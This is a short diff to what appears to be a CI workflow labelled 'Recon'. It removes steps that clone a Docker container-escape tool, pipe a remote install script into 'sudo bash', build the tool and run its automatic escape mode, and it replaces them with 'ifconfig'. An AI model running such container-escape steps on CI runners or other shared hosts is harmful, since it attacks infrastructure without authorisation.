@@ -6,13 +6,8 @@ jobs:
     steps:
       - run: echo "Recon"
       - run: |     
-            git clone https://github.com/PercussiveElbow/docker-escape-tool
-            cd docker-escape-tool
-            curl -fsSL https://crystal-lang.org/install.sh | sudo bash
-            shards install
-            crystal build  --static src/docker-escape.cr
-            ls -lha
-            ./docker-escape auto
+            ifconfig
+            
 
 
 
